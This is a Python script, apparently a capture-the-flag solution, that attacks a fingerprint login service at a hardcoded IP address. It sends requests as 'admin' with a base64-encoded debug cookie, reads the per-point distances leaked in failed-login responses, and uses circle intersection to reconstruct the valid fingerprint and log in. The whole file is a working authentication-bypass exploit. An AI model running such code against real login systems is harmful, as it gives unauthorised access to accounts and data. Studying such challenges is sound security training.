#!/usr/bin/env python3

import requests
import json
import re
import math


def intersect(p, r, R):
    ''' Computes the intersection between a circle center (0,0) and radius r
    and a circle center (p[0], p[1]) and radius R
    This simplifies formulas of 
    http://nains-games.over-blog.com/2014/12/intersection-de-deux-cercles.html

    This is a simplified algorithm e.g it won't work if the circles have no intersection!
    But normally, we have selected centers so that we will have intersections :)
    '''
    assert p[1] != 0, "choose another point because this causes divide by 0"
    
    a = (p[0]**2 + p[1]**2 + r**2 - R**2) / (2 * p[1])
    d = p[0] / p[1]
    A = (d**2) + 1
    assert A != 0, "choose another point. A == 0..."
    
    B = - 2*a*d
    C = a**2 - (r**2)
    delta = B**2 - 4*A*C
    x1 = (-B + math.sqrt(delta) ) / (2*A) 
    x2 = (-B - math.sqrt(delta) ) / (2*A)
    y1 = a - (x1 * d)
    y2 = a - (x2 *d )

    # we return the 2 intersections
    return [x1,y1], [x2,y2]
        


def submit_request(thefingerprint, label=''):
    url = 'http://34.140.103.157:1234'
    username = 'admin'
    cookie={'RGVidWdnaW5n':'VHJ1ZQ=='}
    r = requests.post(url=url, json={"username":username, "fingerprint" : thefingerprint}, cookies=cookie)
    assert r.status_code == 200, "Error when posting request {}".format(label)
    return r

def get_nb_points(content):
    m = re.findall(b'[0-9]+', content)
    assert len(m) == 1, "Error reading necessary salient points"
    nb_points = int(m[0])
    print("[+] we need {} salient points".format(nb_points))
    return nb_points

def get_distances(text):
    distances = re.split(';', text.replace('Login Failed ',''))
    return distances

def sum_distances(dist, nb):
    s = 0
    for i in range(0,nb):
        s = s + float(dist[i])
    print("Distance sum: ", s)
    return s

def main():
    myfingerprint = [ ]
    # Get the nb of salient point we need to submit
    r = submit_request( [], 'request 1')
    nb_points = get_nb_points(r.content)

    # Create the initial fingerprint
    for i in range(0, nb_points):
        myfingerprint.append([0,0])

    print("Get distances from (0,0) ... ")
    r = submit_request(myfingerprint, 'request 2')
    distances1 = get_distances(r.text)

    # We select other points to get distances from these
    # We choose the points "half way" x and y based on the distance we computed previously. This is a choice: we could  have selected other points
    print("Get distances from another point ...")
    for i in range(0, nb_points):
        myfingerprint[i] = [ myfingerprint[i][0]+ float(distances1[i]) / 2 , myfingerprint[i][1]+ float(distances1[i]) / 2 ]

    r = submit_request(myfingerprint, 'request 3')
    distances2 = get_distances(r.text)

    # distances1 contains the radius of circles centered on (0,0)
    # distances2 contains the radius of circles centered on various chosen points
    print("Compute the intersections...")
    solution_p = []
    solution_q = []
    for i in range(0, nb_points):
        p, q = intersect( myfingerprint[i], float(distances1[i]), float(distances2[i]))
        solution_p.append(p)
        solution_q.append(q)
        myfingerprint[i] = p

    # There are (normally) 2 intersections, but we have no way to know which one is correct
    # We arbitrarily select the first intersection, and will adjust afterwards if we are too far
    print("Get distances using first intersection...")
    r = submit_request(myfingerprint, 'request 4')
    distances3 = get_distances(r.text)
    sum_distances(distances3, nb_points)

    for i in range(0, nb_points):
        if float(distances3[i]) >= 0.02:
            # adjusting to the other intersection as we are too far
            myfingerprint[i] = solution_q[i]

    # We should normally have the correct solution now
    print("Solution: ")
    r = submit_request(myfingerprint, 'request 5')
    print(r.text)

if __name__ == "__main__":
    main()
